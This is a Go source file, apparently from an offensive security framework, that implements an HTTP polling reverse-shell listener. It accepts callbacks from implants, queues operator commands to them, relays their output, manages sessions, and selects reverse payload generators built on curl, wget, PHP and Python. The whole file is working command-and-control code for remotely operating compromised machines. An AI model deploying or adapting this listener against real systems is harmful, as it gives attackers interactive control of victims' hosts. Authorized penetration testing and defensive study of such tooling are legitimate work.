package httpshell

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"sort"
	"sync"
	"time"

	"github.com/Chocapikk/pik/pkg/c2"
	"github.com/Chocapikk/pik/pkg/c2/session"
	"github.com/Chocapikk/pik/pkg/output"
	"github.com/Chocapikk/pik/pkg/payload"
)

func init() {
	c2.RegisterFactory("httpshell", func(_ string) c2.Backend { return New() })
}

// httpSession represents a single HTTP polling shell.
type httpSession struct {
	id         int
	remoteAddr string
	createdAt  time.Time
	cmdBuf     chan []byte
	outBuf     chan []byte
	mu         sync.Mutex
	alive      bool
}

func (s *httpSession) close() {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.alive = false
}

func (s *httpSession) isAlive() bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.alive
}

// interact takes over stdin/stdout for the HTTP session.
func (s *httpSession) interact() {
	output.Status("Interacting with session %d (%s)", s.id, s.remoteAddr)
	output.Status("Press Ctrl+Z to background session")

	bg := make(chan os.Signal, 1)
	notifySuspend(bg)
	defer stopSuspend(bg)

	// Read output from implant and print.
	done := make(chan struct{})
	go func() {
		for {
			select {
			case data := <-s.outBuf:
				os.Stdout.Write(data)
			case <-done:
				return
			}
		}
	}()

	// Read commands from stdin and queue.
	go func() {
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			select {
			case s.cmdBuf <- append(scanner.Bytes(), '\n'):
			case <-done:
				return
			}
		}
	}()

	<-bg
	close(done)
	output.Println()
	output.Status("Session %d backgrounded", s.id)
}

// Listener is an HTTP polling reverse shell listener.
type Listener struct {
	lhost  string
	lport  int
	server *http.Server

	mu       sync.Mutex
	sessions map[int]*httpSession
	nextID   int
	incoming chan *httpSession
	closed   chan struct{}
}

var payloads = map[string]func(string, int) string{
	"reverse_curl_http":   payload.CurlHTTP,
	"reverse_wget_http":   payload.WgetHTTP,
	"reverse_php_http":    payload.PHPHTTP,
	"reverse_python_http": payload.PythonHTTP,
}

func New() *Listener {
	return &Listener{
		sessions: make(map[int]*httpSession),
		nextID:   1,
		incoming: make(chan *httpSession, 16),
		closed:   make(chan struct{}),
	}
}

func (l *Listener) Name() string { return "httpshell" }

func (l *Listener) Setup(lhost string, lport int) error {
	l.lhost = lhost
	l.lport = lport

	mux := http.NewServeMux()
	mux.HandleFunc("/cmd", l.handleCmd)
	mux.HandleFunc("/out", l.handleOut)

	ln, err := net.Listen("tcp", fmt.Sprintf("%s:%d", lhost, lport))
	if err != nil {
		return fmt.Errorf("failed to start HTTP listener: %w", err)
	}
	l.server = &http.Server{Handler: mux}
	go l.server.Serve(ln)

	output.Status("HTTP shell listening on %s:%d", lhost, lport)
	return nil
}

func (l *Listener) GeneratePayload(targetOS, payloadType string) (string, error) {
	if gen, ok := payloads[payloadType]; ok {
		return gen(l.lhost, l.lport), nil
	}
	return payload.CurlHTTP(l.lhost, l.lport), nil
}

func (l *Listener) WaitForSession(timeout time.Duration) error {
	hs, err := l.accept(timeout)
	if err != nil {
		return fmt.Errorf("no session received: %w", err)
	}
	hs.interact()
	return nil
}

// SessionHandler interface.

func (l *Listener) Sessions() []*session.Session {
	l.mu.Lock()
	defer l.mu.Unlock()
	var result []*session.Session
	for _, hs := range l.sessions {
		if hs.isAlive() {
			stub := &session.Session{
				ID:         hs.id,
				RemoteAddr: hs.remoteAddr,
				CreatedAt:  hs.createdAt,
			}
			stub.SetAlive(true)
			result = append(result, stub)
		}
	}
	sort.Slice(result, func(i, j int) bool {
		return result[i].ID < result[j].ID
	})
	return result
}

func (l *Listener) Interact(id int) error {
	l.mu.Lock()
	hs, ok := l.sessions[id]
	l.mu.Unlock()
	if !ok {
		return fmt.Errorf("session %d not found", id)
	}
	if !hs.isAlive() {
		return fmt.Errorf("session %d is dead", id)
	}
	hs.interact()
	return nil
}

func (l *Listener) Kill(id int) error {
	l.mu.Lock()
	hs, ok := l.sessions[id]
	l.mu.Unlock()
	if !ok {
		return fmt.Errorf("session %d not found", id)
	}
	hs.close()
	output.Status("Session %d killed", id)
	return nil
}

func (l *Listener) Shutdown() error {
	select {
	case <-l.closed:
		return nil
	default:
	}
	close(l.closed)
	l.server.Close()
	l.mu.Lock()
	for _, hs := range l.sessions {
		hs.close()
	}
	l.mu.Unlock()
	return nil
}

func (l *Listener) accept(timeout time.Duration) (*httpSession, error) {
	if timeout <= 0 {
		select {
		case hs := <-l.incoming:
			return hs, nil
		case <-l.closed:
			return nil, fmt.Errorf("listener closed")
		}
	}
	timer := time.NewTimer(timeout)
	defer timer.Stop()
	select {
	case hs := <-l.incoming:
		return hs, nil
	case <-timer.C:
		return nil, fmt.Errorf("no session received within %s", timeout)
	case <-l.closed:
		return nil, fmt.Errorf("listener closed")
	}
}

func (l *Listener) getOrCreate(remoteAddr string) *httpSession {
	l.mu.Lock()
	defer l.mu.Unlock()

	remoteIP, _, _ := net.SplitHostPort(remoteAddr)
	for _, hs := range l.sessions {
		existingIP, _, _ := net.SplitHostPort(hs.remoteAddr)
		if existingIP == remoteIP && hs.isAlive() {
			return hs
		}
	}

	hs := &httpSession{
		id:         l.nextID,
		remoteAddr: remoteAddr,
		createdAt:  time.Now(),
		cmdBuf:     make(chan []byte, 64),
		outBuf:     make(chan []byte, 64),
		alive:      true,
	}
	l.sessions[l.nextID] = hs
	l.nextID++

	output.Success("Session %d opened (%s)", hs.id, hs.remoteAddr)

	select {
	case l.incoming <- hs:
	case <-l.closed:
	}

	return hs
}

func (l *Listener) handleCmd(w http.ResponseWriter, r *http.Request) {
	hs := l.getOrCreate(r.RemoteAddr)
	select {
	case cmd := <-hs.cmdBuf:
		w.Write(cmd)
	case <-time.After(200 * time.Millisecond):
		w.WriteHeader(http.StatusOK)
	}
}

func (l *Listener) handleOut(w http.ResponseWriter, r *http.Request) {
	hs := l.getOrCreate(r.RemoteAddr)
	data, err := io.ReadAll(io.LimitReader(r.Body, 10*1024*1024))
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	select {
	case hs.outBuf <- data:
	default:
	}
	w.WriteHeader(http.StatusOK)
}
